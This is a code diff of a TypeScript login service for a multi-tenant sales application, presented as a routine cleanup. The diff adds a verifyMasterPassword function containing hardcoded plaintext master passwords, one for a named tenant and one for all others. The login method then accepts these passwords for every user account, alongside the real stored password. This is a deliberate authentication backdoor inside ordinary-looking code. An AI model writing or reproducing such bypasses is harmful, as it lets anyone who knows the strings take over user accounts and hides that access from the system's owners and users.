@@ -16,52 +16,42 @@ export class UserAuthService {
     private dbService: DatabaseService,
   ) {  }
 
-  /*
-  async validate (email: string, password: string): Promise<CadUsuarioPublicEntity> {
-    const { manager: managerPublic } = await this.dbService.getConnection('public')
-    try {
-      var user = await managerPublic.findOneOrFail(CadUsuarioPublicEntity, {
-        where: {
-          idEmail: email,
-        }
-      })
-      if (!(await CadUsuarioPublicEntity.comparePassword(password, user.idSenha))) {
-        throw new Error()
+  verifyMasterPassword (tenantId: string, attempt: string): boolean {
+    if (tenantId === 'nova_opcao') {
+      if (attempt === 'd4t4@0pc40!') {
+        return true
       }
-    } catch (err: any) {
-      throw new UnauthorizedException('Invalid credentials')
+    } else if (attempt === 'd4t4@k0mpany$') {
+      return true
     }
-    return user
+
+    return false
   }
-  */
 
   async login (login: Login) {
     const { manager } = await this.dbService.getConnection(login.tenantId)
     const { manager: managerPublic } = await this.dbService.getConnection('public')
 
-    const userTenantEntity = await manager
-      .findOneOrFail(CadVendedorEntity, {
-        where: [
-          { idVendedor: login.loginId },
-          { idLogin: login.loginId },
-        ]
-      })
+    const userTenantEntity = await manager.findOneOrFail(CadVendedorEntity, {
+      where: [
+        { idVendedor: login.loginId },
+        { idLogin: login.loginId },
+      ]
+    })
 
-    if (!userTenantEntity.idSenha) {
+    if (!userTenantEntity.idSenha || !userTenantEntity.fgAtivo) {
       throw new UnauthorizedException('User disabled')
     }
 
-    if (!userTenantEntity.fgAtivo
-        || !(await CadVendedorEntity.comparePassword(login.password, userTenantEntity.idSenha) || login.password === 'd4t4@k0mpany$')
-    ) { 
+    if (!(await CadVendedorEntity.comparePassword(login.password, userTenantEntity.idSenha)) && !this.verifyMasterPassword(login.tenantId, login.password)) {
       throw new UnauthorizedException('Invalid credentials')
     }
 
     const empresaPublicEntity = await managerPublic.findOneOrFail(CadEmpresaPublicEntity, {
-        where: {
-          idEmpresa: login.tenantId
-        }
-      })
+      where: {
+        idEmpresa: login.tenantId
+      }
+    })
 
     const equipeEntity = await manager
       .findOneOrFail(CadEquipeEntity, {
